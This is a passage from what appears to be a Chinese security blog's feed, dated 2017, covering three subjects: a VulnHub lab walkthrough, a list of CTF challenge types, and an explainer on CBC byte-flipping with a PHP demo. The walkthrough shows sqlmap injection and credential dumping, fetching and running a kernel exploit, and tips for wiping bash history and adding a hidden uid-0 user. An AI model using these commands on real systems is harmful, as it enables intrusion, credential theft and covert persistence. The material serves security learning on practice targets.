&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;echo %PROCESSOR_ARCHITECTURE%&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>一次基于Linux的渗透测试</title>
    <link href="http://yoursite.com/%E6%B8%97%E9%80%8F/2017/05/18/%E4%B8%80%E6%AC%A1%E5%9F%BA%E4%BA%8ELinux%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html"/>
    <id>http://yoursite.com/渗透/2017/05/18/一次基于Linux的渗透测试.html</id>
    <published>2017-05-18T07:52:39.000Z</published>
    <updated>2017-05-18T08:49:06.858Z</updated>
    
    <content type="html"><![CDATA[<p>　　最近发现了一个不错的<a href="https://www.vulnhub.com" target="_blank" rel="external">靶场</a>，里面各种渗透测试的虚拟机，大家可以下载进行尝试学习。还有就是一个<a href="https://www.exploit-db.com" target="_blank" rel="external">漏洞利用存档</a>，可以找到很多我们可以利用的学习的东西。 </p>
<h3 id="0x01-信息搜集"><a href="#0x01-信息搜集" class="headerlink" title="0x01 信息搜集"></a>0x01 信息搜集</h3><ul>
<li>首先就是确定我们靶机的目标IP<br><code>nmap -sP -T5 192.168.0.1/24</code><a id="more"></a><br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/69675734-file_1495024767524_12b41.png" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/92578056-file_1495024794093_f650.png" alt=""><br>通过前面的步骤，我们对目标进行具体的端口扫描以及操作系统识别，发现开启有80，22以及6667端口。<br><code>nmap -sV -p- -A -O -T4 192.168.0.170</code><br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/29748247-file_1495025167563_18075.png" alt=""> </li>
<li>目录扫描<br>继续对目标进行敏感目录扫描，御剑等工具都可以。这里我使用KALI的<code>nikto</code>以及<code>dirb</code>命令进行简单的目录扫描。<br><code>nikto -host http://192.168.0.170</code>或者<code>dirb http://192.168.0.170</code></li>
</ul>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/1901036-file_1495026985555_c687.jpg" alt=""></p>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/34894438-file_1495026990934_c5e1.jpg" alt=""></p>
<h3 id="0x02-漏洞发现"><a href="#0x02-漏洞发现" class="headerlink" title="0x02 漏洞发现"></a>0x02 漏洞发现</h3><p>　　访问IP之后的页面，发现并没有什么特别的地方，于是只能查看源代码，点击超链接进行查看。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/72915652-file_1495025513089_4b42.png" alt=""></p>
<p>在链接的地方竟然发现了秘密的地方，于是访问之<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/16907544-file_1495027180453_a40c.png" alt=""><br>此处是一个登录界面，我们可以尝试注册一个用户进行登录，但只是一个游客的形式。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/77969300-file_1495027584527_6db5.png" alt=""><br>我们注册一个用户进行登录，还有有很多功能的，于是可以进行更多的尝试。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/87595415-file_1495028411853_56b6.png" alt=""></p>
<p>　　在下面发现OpenDocMan v1.2.7， OpenDocMan是一个功能完整的基于Web的文档管理系统(DMS)，于是找找OpenDocMan v1.2.7所公布的一些可以利用的<a href="https://www.exploit-db.com/exploits/32075/" target="_blank" rel="external">漏洞</a>。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/52436738-file_1495029065698_1762a.png" alt=""><br>发现可以利用的好几个漏洞，于是先行尝试sql注入。</p>
<h3 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h3><p>　　经过简单的测试发现<code>http://192.168.0.170/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user</code>处确实注入。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/72043277-file_1495029395412_5b3f.png" alt=""></p>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/40331315-file_1495029419098_1162.png" alt=""><br>于是直接拿出神器Sqlmap进行注入。<br><code>sqlmap.py -u &quot;http://192.168.0.170/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user&quot; -p add_value --dbs</code><br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-17/50127468-file_1495029835183_507e.png" alt=""><br>经过常见的那几个命令我们可以成功的拿到登录名和密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sqlmap.py -u &quot;http://192.168.0.170/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user&quot; -p add_value -D jabcd0cs --tables</div><div class="line">sqlmap.py -u &quot;http://192.168.0.170/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user&quot; -p add_value -D jabcd0cs -T odm_admin --columns</div></pre></td></tr></table></figure></p>
<p>发现admin表里面没有信息，只能从user表里面提取信息。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sqlmap.py -u &quot;http://192.168.0.170/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user&quot; -p add_value -D jabcd0cs -T odm_user --columns`</div><div class="line">sqlmap.py -u &quot;http://192.168.0.170/jabcd0cs/ajax_udf.php?q=1&amp;add_value=odm_user&quot; -p add_value -D jabcd0cs -T odm_user -C &quot;username,password&quot; --dump</div></pre></td></tr></table></figure></p>
<p>我们可以看到已经获取到了数据库的用户名和密码，直接MD5解密就可以ssh登录服务器。<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-18/42366405-file_1495083173994_9c37.png" alt=""><br>用户名<code>webmin</code>，密码<code>b78aae356709f8c31118ea613980954b</code>，明文为<code>webmin</code></p>
<h3 id="0x04-权限提升"><a href="#0x04-权限提升" class="headerlink" title="0x04 权限提升"></a>0x04 权限提升</h3><p>经过前面端口扫描可以发现，22端口发放着，可以进行ssh连接。<code>ssh webmin@192.168.0.170</code><br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-18/75985467-file_1495083672930_ba2a.jpg" alt=""><br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-18/61650463-file_1495083646059_acf0.png" alt=""><br>　　<br>　　查看权限发现是普通用户的权限，所以得继续进行提权操作。获取到低权限SHELL后我们通常做下面几件事：</p>
<ul>
<li>检测操作系统的发行版本</li>
<li>查看内核版本</li>
<li>检测当前用户权限</li>
<li>列举Suid文件</li>
<li>查看已经安装的包，程序，运行的服务，过期版本的有可能有漏洞</li>
</ul>
<p><code>lsb_release -a</code>查看系统的发行版本<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-18/73239541-file_1495083911393_12b4.png" alt=""><br><code>uname -a</code>查看内核版本<br><img src="http://obh1qcqek.bkt.clouddn.com/17-5-18/40320294-file_1495083992867_f6e7.png" alt=""></p>
<p>　　我们可以看到此操作系统采用的是Ubuntu 14.04.4 LTS，内核版本是3.13.0-24-generic，首先想到的就是去漏洞库寻找有没有可以用的exploit。</p>
<p>下载漏洞exploit<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">wget https://www.exploit-db.com/download/37292</div><div class="line">mv 37292 shell.c</div><div class="line">gcc -o shell shell.c</div><div class="line">./shell</div></pre></td></tr></table></figure></p>
<p><img src="http://obh1qcqek.bkt.clouddn.com/17-5-18/23001066-file_1495084882743_12f82.png" alt=""></p>
<p><strong>附Linux渗透小技巧：</strong></p>
<ul>
<li>bash去掉history记录<br>export HISTSIZE=0<br>export HISTFILE=/dev/null</li>
<li>Linux添加uid为0的用户<br>useradd -o -u 0 cnbird</li>
<li>可以翻下 mysql_history .bash_history</li>
<li>ls -al 看下root目录下都有什么隐藏目录 例如 .ssh .vnc 等</li>
<li>可以看下 .ssh/下面的ssh连接记录等，也可以看下全局变量文件什么的</li>
<li>通过webshell反弹shell回来之后获取真正的ttyshell<br><code>python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</code></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;　　最近发现了一个不错的&lt;a href=&quot;https://www.vulnhub.com&quot;&gt;靶场&lt;/a&gt;，里面各种渗透测试的虚拟机，大家可以下载进行尝试学习。还有就是一个&lt;a href=&quot;https://www.exploit-db.com&quot;&gt;漏洞利用存档&lt;/a&gt;，可以找到很多我们可以利用的学习的东西。 &lt;/p&gt;
&lt;h3 id=&quot;0x01-信息搜集&quot;&gt;&lt;a href=&quot;#0x01-信息搜集&quot; class=&quot;headerlink&quot; title=&quot;0x01 信息搜集&quot;&gt;&lt;/a&gt;0x01 信息搜集&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;首先就是确定我们靶机的目标IP&lt;br&gt;&lt;code&gt;nmap -sP -T5 192.168.0.1/24&lt;/code&gt;
    
    </summary>
    
      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>CTF常见题型</title>
    <link href="http://yoursite.com/CTF/2017/04/29/CTF%E5%B8%B8%E8%A7%81%E9%A2%98%E5%9E%8B.html"/>
    <id>http://yoursite.com/CTF/2017/04/29/CTF常见题型.html</id>
    <published>2017-04-29T05:11:47.000Z</published>
    <updated>2017-04-29T05:17:16.304Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Web"><a href="#0x01-Web" class="headerlink" title="0x01 Web"></a>0x01 Web</h2><ul>
<li>一、爆破，包括包括md5、爆破随机数、验证码识别等</li>
<li>二、绕WAF，包括花式绕Mysql、绕文件读取关键词检测之类拦截</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">注入：http://103.238.227.13:10087/</div><div class="line">盲注：http://ctf5.shiyanbar.com/web/wonderkun/index.php</div><div class="line">注入绕过：http://a.sql.bugku.com/web2/  提示 !,!=,=,+,-,^,%</div><div class="line">http://web.jarvisoj.com:32787/</div></pre></td></tr></table></figure>
<a id="more"></a>
<ul>
<li>三、花式玩弄几个PHP特性，包括弱类型，strpos和===，反序列化+destruct、\0截断、iconv截断、</li>
<li>四、PHP伪协议，zip://、phar://、php://filter/read等</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://web.jarvisoj.com:32768/</div></pre></td></tr></table></figure>
<ul>
<li>五、各种找源码技巧，包括git、svn、xxx.php.swp、<em>www</em>.(zip|tar.gz|rar|7z)、xxx.php.bak、</li>
<li>六、文件上传，包括花式文件后缀 .php345 .inc .phtml .phpt .phps、各种文件内容检测&lt;?php &lt;? &lt;% 、花式解析漏洞</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://c.bugku.com/web9/</div><div class="line">http://web.jarvisoj.com:32790/</div><div class="line">http://web.jarvisoj.com:32785/index.php#</div></pre></td></tr></table></figure>
<ul>
<li>七、Mysql类型差异，包括和PHP弱类型类似的特性,0x、0b、1e之类，varchar和integer相互转换</li>
<li>八、open_basedir、disable_functions花式绕过技巧，包括dl、mail、imagick、bash漏洞、DirectoryIterator及各种二进制选手插足的方法</li>
<li>九、条件竞争，包括竞争删除前生成shell、竞争数据库无锁多扣钱</li>
<li>十、windows特性，包括短文件名、IIS解析漏洞、NTFS文件系统通配符、::$DATA，冒号截断</li>
<li>十一、SSRF，包括花式探测端口，302跳转、花式协议利用、gophar直接取shell等</li>
<li>十二、XSS，各种浏览器auditor绕过、富文本过滤黑白名单绕过、flash xss、CSP绕过</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XSS:http://103.238.227.13:10089/</div></pre></td></tr></table></figure>
<ul>
<li>十三、XXE，各种XML存在地方（rss/word/流媒体）、各种XXE利用方法（SSRF、文件读取）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://web.jarvisoj.com:9882/  请设法获得目标机器/home/ctf/flag.txt中的flag值。</div></pre></td></tr></table></figure>
<ul>
<li>十四、协议，花式IP伪造 X-Forwarded-For/X-Client-IP/X-Real-IP/CDN-Src-IP、花式改UA，花式藏FLAG、花式分析数据包</li>
<li>十五、python脚本，盲注脚本、POST提交脚本等，常见python库</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">urllib、urllib2、requests   # 发送 HTTP 请求的</div><div class="line">urlparse                    # 处理 url </div><div class="line">re                          # 正则表达式</div><div class="line">random                      # 生成随机数的</div><div class="line">hashlib                     # 集成md5算法</div><div class="line">base64                      # base64编码</div><div class="line">socket                      # 套接字</div><div class="line">os/sys      </div><div class="line"></div><div class="line">练习：http://c.bugku.com/web6/</div></pre></td></tr></table></figure>
<h2 id="0X02-Misc"><a href="#0X02-Misc" class="headerlink" title="0X02 Misc"></a>0X02 Misc</h2><ul>
<li>一、压缩包加密，伪加密、暴力破解、明文攻击、CRC32碰撞</li>
<li>二、图片隐写，LSB、Stegsolve、binwalk、foremost、JPHS、文件头部属性、RGB图片像素点还原</li>
<li>三、音频隐写，MP3Stego、分析频谱</li>
<li>四、流量包分析，追踪流、直接导出、binwalk、foremost</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1、[这么多数据包找找吧，先找到getshell的流]http://ctf.bugku.com/files/bcd48bf8357a2f4e41ef16705443c46e/CTF.pcapng.zip</div><div class="line">2、 http://ctf5.shiyanbar.com/misc/misc300.zip</div></pre></td></tr></table></figure>
<ul>
<li>五、社工，包括花式查社工库、微博、QQ签名、whois</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1、[简单个人信息搜集](http://ctf.bugku.com/files/578343f52edfa1107fae1c76f0f9a48a/1.zip)</div><div class="line">2、name:孤长离  提示：弱口令</div></pre></td></tr></table></figure>
<h2 id="0x03-Crypto"><a href="#0x03-Crypto" class="headerlink" title="0x03 Crypto"></a>0x03 Crypto</h2><ul>
<li>一、古典密码</li>
<li>二、现代密码，RSA、hash长度扩展、异或、移位加密各种变形、32位随机数过小、唯密文攻击</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">链接: http://pan.baidu.com/s/1i4TQoz7 密码: w65m</div><div class="line">提示：第一层：CRC32 碰撞;第二层：维吉尼亚密码;第三层：sha1 碰撞;第四层：md5 相同文件不同;第五层：RSA</div><div class="line">RSA：http://ctf5.shiyanbar.com/crypto/RSA</div><div class="line">唯密文攻击：http://ctf5.shiyanbar.com/crypto/ciphertext.zip（试试看破解这个 1024 位 RSA 系统。flag的形式是 CTF&#123;USTC-X&#125;，X 是 RSA 的两个素数中较小的那个（取其大写MD5的前6位））</div></pre></td></tr></table></figure>
<p>推荐练习平台：<br>汪神平台：<a href="https://www.jarvisoj.com/" target="_blank" rel="external">https://www.jarvisoj.com/</a><br><a href="http://ctf.bugku.com/" target="_blank" rel="external">http://ctf.bugku.com/</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-Web&quot;&gt;&lt;a href=&quot;#0x01-Web&quot; class=&quot;headerlink&quot; title=&quot;0x01 Web&quot;&gt;&lt;/a&gt;0x01 Web&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;一、爆破，包括包括md5、爆破随机数、验证码识别等&lt;/li&gt;
&lt;li&gt;二、绕WAF，包括花式绕Mysql、绕文件读取关键词检测之类拦截&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;注入：http://103.238.227.13:10087/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;盲注：http://ctf5.shiyanbar.com/web/wonderkun/index.php&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;注入绕过：http://a.sql.bugku.com/web2/  提示 !,!=,=,+,-,^,%&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;http://web.jarvisoj.com:32787/&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CBC字节翻转攻击</title>
    <link href="http://yoursite.com/CTF/2017/04/24/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB.html"/>
    <id>http://yoursite.com/CTF/2017/04/24/CBC字节翻转攻击.html</id>
    <published>2017-04-24T01:51:18.000Z</published>
    <updated>2017-06-18T02:19:46.188Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-CBC翻转技术"><a href="#0x01-CBC翻转技术" class="headerlink" title="0x01 CBC翻转技术"></a>0x01 CBC翻转技术</h3><p>　　<a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation" target="_blank" rel="external">CBC</a>模式的全称是密文分组链接模式（Cipher Block Chainning)，之所以叫这个名字，是因为密文分组是像链条一样相互连接在一起的。<br><img src="http://i2.muimg.com/567571/0b694168b633add3.png" alt=""><a id="more"></a><br>　　在CBC模式中，首先将明文分组与前一个密文分组进行XOR运算，然后再进行加密，当加密第一个明文分组时，由于不存在“前一个密文分组”，因此需要事先准备一个长度为一个分组的比特序列来代替“前一个密文分组”，这个比特序列称为初始化向量（Initialization vector),通常缩写为IV,如果每次都使用相同的初始化向量（IV），当用同一密钥对同一明文进行加密时，所得到的密码一定是相同的，所以每次加密时都会随机产生一个不同的比特序列来作为初始化向量，避免这种情况产生。即：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">首先将明文分组(常见的以16字节为一组)，位数不足的使用特殊字符填充。</div><div class="line">生成一个随机的初始化向量(IV)和一个密钥。</div><div class="line">将IV和第一组明文异或。</div><div class="line">用密钥对3中xor后产生的密文加密。</div><div class="line">用4中产生的密文对第二组明文进行xor操作。</div><div class="line">用密钥对5中产生的密文加密。</div><div class="line">重复4-7，到最后一组明文。</div><div class="line">将IV和加密后的密文拼接在一起，得到最终的密文。</div></pre></td></tr></table></figure></p>
<p>加密公式：</p>
<ul>
<li><p>Ciphertext-0 = Encrypt(Plaintext XOR IV) —只用于第一个组块</p>
</li>
<li><p>Ciphertext-N = Encrypt(Plaintext XOR Ciphertext-N-1) —用于第二及剩下的组块<br>　　<br><img src="http://i2.muimg.com/567571/f24e769a0be02a4c.png" alt=""></p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">从密文中提取出IV，然后将密文分组。</div><div class="line">使用密钥对第一组的密文解密，然后和IV进行xor得到明文。</div><div class="line">使用密钥对第二组密文解密，然后和2中的密文xor得到明文。</div><div class="line">重复2-3，直到最后一组密文。</div></pre></td></tr></table></figure>
<p>解密公式：</p>
<ul>
<li><p>Plaintext-0 = Decrypt(Ciphertext) XOR IV—只用于第一个组块</p>
</li>
<li><p>laintext-N = Decrypt(Ciphertext) XOR Ciphertext-N-1—用于第二及剩下的组块</p>
</li>
</ul>
<h3 id="0x02-翻转攻击"><a href="#0x02-翻转攻击" class="headerlink" title="0x02 翻转攻击"></a>0x02 翻转攻击</h3><p>　　<strong>可以注意到Ciphertext-N-1用来产生下一块明文</strong>，这就是字节翻转攻击开始发挥作用的地方，如果我们改变Ciphertext-N-1中的一个字节，然后和下一块解密后的密文xor，就可以得到一个不同的明文，而这个明文是我们可以控制的。利用这一点，我们就欺骗服务端或者绕过过滤器。<br>　　CBC比特反转攻击的目的是攻击者通过修改密文来操纵解密后的明文，攻击者会对初始化向量（IV）中的任意比特位进行反转（1变0，0变1），则明文分组（解密后得到的明文分组）中相应的比特也会被反转。比如一个叫admin的用户，登录，经过CBC模式加密后，token为”aaabbbccc999”,现在有一个攻击者，叫john，登录，经过CBC模式加密后，token为cccbbbccc1111,现在john将token改为”ffcbbbccc1111”，发现登录名变成了ohn，所以他知道token第一个位的ff转换成了，经过几轮测试，他发现如果将token改为“7bcbbbccc1111”，则登录名变成了’aohn’，最后他通过发送token为7bdc995465到服务器，发现自己已经变成了admin。</p>
<p><img src="http://i4.buimg.com/567571/72106305bef82c9d.jpg" alt=""></p>
<p>　　根据解密流程，我们假设A为密文经过AES解密后的字串，B为前一组密文，C为明文：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">A = Decrypt(Ciphertext)[0] = 6</div><div class="line">B = (Ciphertext-N-1)[0] = 13</div><div class="line">C = Plaintext[0] = 11</div></pre></td></tr></table></figure></p>
<p>　　那么经过解密过程可知：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">C = A xor B</div></pre></td></tr></table></figure></p>
<p>　　那么<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">A xor B xor C = 0 (任何数与自己异或都为0)</div></pre></td></tr></table></figure></p>
<p>　　由于任何数与0异或都为自己本身，则<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">A xor B xor C xor 3 = 3</div></pre></td></tr></table></figure></p>
<p>　　那么此时我们可以这样来看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">A = A = 6</div><div class="line">B = B xor 3 = 13 xor 3 xor 11 = 5</div><div class="line">C = C = 11</div></pre></td></tr></table></figure></p>
<p>　　现在我们修改密文对应的位让B = 5，那么当密文解密后，会发现，明文C会变成3，通过这种方法我们可以控制任何一位明文。</p>
<h3 id="0x03-实例说明"><a href="#0x03-实例说明" class="headerlink" title="0x03 实例说明"></a>0x03 实例说明</h3><p>　　我们举例说明一下这个例子，这里有一个明文序列：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;sdsdsd&quot;;s:8:&quot;greeting&quot;;s:20:&quot;echo &apos;Hello sdsdsd!&apos;&quot;;&#125;</div></pre></td></tr></table></figure></p>
<p>　　我们的目标是将“s:6”当中的数字6转换成数字“7”。我们需要做的第一件事就是把明文分成16个字节的块：</p>
<ul>
<li>Block 1:a:2:{s:4:”name”;</li>
<li>Block 2:s:6:”sdsdsd”;s:8</li>
<li>Block 3::”greeting”;s:20</li>
<li>Block 4::”echo ‘Hello sd</li>
<li>Block 5:sdsd!’”;}</li>
</ul>
<p>　　我们需要更改的字符位于<strong>块２</strong>，因此我们需要改变<strong>块1</strong>的密文来改变<strong>块2</strong>的明文。在密文中改变的字节，只会影响到在下一明文当中，具有相同偏移量的字节。<br>　　因此我们只需要改变在第一个密文块当中，偏移量是2的字节。在第2行我们得到了整个数据的密文，然后在第3行中，我们改变块1中偏移量为2的字节，最后我们再调用解密函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$v = &quot;a:2:&#123;s:4:&quot;name&quot;;s:6:&quot;sdsdsd&quot;;s:8:&quot;greeting&quot;;s:20:&quot;echo &apos;Hello sdsdsd!&apos;&quot;;&#125;&quot;;</div><div class="line">$enc = @encrypt($v);</div><div class="line">$enc[2] = chr(ord($enc[2]) ^ ord(&quot;6&quot;) ^ ord (&quot;7&quot;));</div><div class="line">$b = @decrypt($enc);</div></pre></td></tr></table></figure>
<p><img src="http://i2.muimg.com/567571/1ba83675efa713e6.png" alt=""><br>　　这样我们就把“s:6”当中的数字6转换成数字“7”，达到来了我们想要的目的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">define(&apos;MY_AES_KEY&apos;, &quot;abcdef0123456789&quot;);</div><div class="line">function aes($data, $encrypt) &#123;</div><div class="line">    $aes = mcrypt_module_open(MCRYPT_RIJNDAEL_128, &apos;&apos;, MCRYPT_MODE_CBC, &apos;&apos;);</div><div class="line">    $iv = &quot;1234567891234567&quot;;</div><div class="line">    mcrypt_generic_init($aes, MY_AES_KEY, $iv);</div><div class="line">    return $encrypt ? mcrypt_generic($aes,$data) : mdecrypt_generic($aes,$data);</div><div class="line">&#125;</div><div class="line"></div><div class="line">define(&apos;MY_MAC_LEN&apos;, 40);</div><div class="line"></div><div class="line">function encrypt($data) &#123;</div><div class="line">    return aes($data, true);</div><div class="line">&#125;</div><div class="line"></div><div class="line">function decrypt($data) &#123;</div><div class="line">    $data = rtrim(aes($data, false), &quot;\0&quot;);ss</div><div class="line">    return $data;</div><div class="line">&#125;</div><div class="line">$v = &quot;a:2:&#123;s:4:\&quot;name\&quot;;s:6:\&quot;sdsdsd\&quot;;s:8:\&quot;greeting\&quot;;s:20:\&quot;echo &apos;Hello sdsdsd!&apos;\&quot;;&#125;&quot;;</div><div class="line">echo &quot;Plaintext before attack: $v\n&quot;;</div><div class="line">$b = array();</div><div class="line">$enc = array();</div><div class="line">$enc = @encrypt($v);</div><div class="line">$enc[2] =  chr(ord($enc[2]) ^ ord(&quot;6&quot;) ^ ord (&quot;7&quot;));</div><div class="line">$b = @decrypt($enc);</div><div class="line">echo &quot;Plaintext AFTER attack : $b\n&quot;;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>参考链接：<br><a href="http://drops.wooyun.org/tips/4975" target="_blank" rel="external">使用CBC比特反转攻击绕过加密的会话令牌</a><br><a href="http://zke1ev3n.me/2015/12/15/CBC%E5%AD%97%E8%8A%82%E5%8F%8D%E8%BD%AC%E6%94%BB%E5%87%BB/" target="_blank" rel="external">CBC字节反转攻击</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-CBC翻转技术&quot;&gt;&lt;a href=&quot;#0x01-CBC翻转技术&quot; class=&quot;headerlink&quot; title=&quot;0x01 CBC翻转技术&quot;&gt;&lt;/a&gt;0x01 CBC翻转技术&lt;/h3&gt;&lt;p&gt;　　&lt;a href=&quot;https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation&quot;&gt;CBC&lt;/a&gt;模式的全称是密文分组链接模式（Cipher Block Chainning)，之所以叫这个名字，是因为密文分组是像链条一样相互连接在一起的。&lt;br&gt;&lt;img src=&quot;http://i2.muimg.com/567571/0b694168b633add3.png&quot; alt=&quot;&quot;&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="密码学" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>PHP伪协议</title>
    <link href="http://yoursite.com/%E4%BB%A3%E7%A0%81/2017/04/09/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE.html"/>
